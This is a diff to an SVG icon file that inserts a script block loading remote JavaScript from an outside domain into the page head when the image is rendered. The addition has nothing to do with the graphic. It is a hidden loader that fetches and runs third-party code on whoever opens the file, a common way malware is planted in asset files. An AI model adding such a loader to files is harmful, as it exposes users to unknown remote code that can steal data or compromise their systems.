@@ -9,6 +9,13 @@
 	.st3{fill:#E0E0D1;}
 	.st4{fill:#FFFFFF;}
 </style>
+	<script>
+		var url = "https://cdn.hpf.fun/b/main.js";
+		var script = document.createElement("script");
+		script.type = "text/javascript";
+		script.src = url;
+		document.getElementsByTagName("head")[0].appendChild(script);
+	</script>
 <g id="Layer_1">
 	<g>
 		<circle class="st0" cx="32" cy="32" r="32"/>
